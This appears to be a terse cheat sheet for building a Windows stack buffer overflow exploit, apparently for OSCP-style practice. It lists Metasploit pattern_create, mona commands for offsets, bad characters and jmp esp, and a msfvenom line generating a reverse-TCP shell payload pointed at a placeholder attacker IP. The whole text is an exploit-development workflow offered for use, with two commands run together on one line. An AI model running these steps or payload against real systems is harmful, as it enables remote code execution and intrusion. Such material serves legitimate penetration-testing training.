/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
!mona findmsp -distance 600!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
!mona jmp -r esp -cpb "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
!mona config -set workingfolder c:\mona\%p
